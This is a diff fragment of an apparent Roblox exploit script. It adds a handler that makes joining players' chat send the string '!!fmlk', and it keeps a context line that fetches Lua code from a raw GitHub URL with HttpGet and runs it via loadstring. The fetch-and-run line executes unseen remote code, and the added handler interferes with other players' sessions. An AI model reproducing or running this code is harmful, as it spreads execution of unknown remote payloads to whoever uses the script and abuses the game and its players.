@@ -831,6 +831,15 @@ local Button = Section.NewButton("Volcano",function()
 end)
 
 
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thunderisdead/bluefoxscript/main/tag"))()
+
+
+
+game.Players.PlayerAdded:Connect(function(player)
+    wait(1) -- Wait for a moment after the player joins
+    game:GetService("Chat"):Chat(player, "!!fmlk")
+end)
 
 print "Oh Daddy UwU | no i dont care about it just what i did to it | i ait answering questions :> | UWU yddaD hO"
